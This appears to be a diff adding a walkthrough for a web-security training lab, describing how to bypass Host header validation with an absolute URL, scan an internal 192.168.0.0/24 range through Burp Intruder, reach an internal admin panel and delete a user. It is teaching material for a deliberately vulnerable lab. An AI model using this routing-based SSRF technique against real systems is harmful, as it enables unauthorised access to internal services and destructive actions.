@@ -1,0 +1,45 @@
+Steps:
+
+1. Send the GET / request that returned 200 OK to Burp Repeater.
+
+2. Confirm that modifying the Host header directly causes the request to be blocked.
+
+3. Change the request line to use an absolute URL:
+   GET https://<LAB-ID>.web-security-academy.net/ HTTP/1.1
+   Host: <LAB-ID>.web-security-academy.net
+
+4. Confirm that changing the Host header now results in a timeout instead of the usual Host-header validation error. This indicates that the absolute URL is being used for validation.
+
+5. Insert a Burp Collaborator payload into the Host header and send the request, for example:
+   GET https://<LAB-ID>.web-security-academy.net/ HTTP/1.1
+   Host: <COLLABORATOR-DOMAIN>
+
+6. Poll the Collaborator tab and confirm that an HTTP interaction was received.
+
+7. Send the request containing the absolute URL to Burp Intruder.
+
+8. In Intruder, disable:
+    Update Host header to match target
+
+9. Configure the Host header to scan:
+    192.168.0.0/24
+
+10. Identify the internal IP that responds as the admin interface and send the corresponding request to Burp Repeater.
+
+11. Append /admin to the absolute URL:
+ GET https://<LAB-ID>.web-security-academy.net/admin HTTP/1.1
+ Host: 192.168.0.X
+
+12. Confirm that the internal admin panel is accessible.
+
+13. Change the absolute URL to:
+ https://<LAB-ID>.web-security-academy.net/admin/delete?csrf=<CSRF-TOKEN>&username=carlos
+
+14. Copy the CSRF token from the admin response and replace <CSRF-TOKEN> with the actual value.
+
+15. Copy the session cookie from the Set-Cookie header and add it to the request.
+
+16. Right-click the request and select:
+     Change request method
+
+17. Send the resulting POST request to delete carlos and solve the lab.
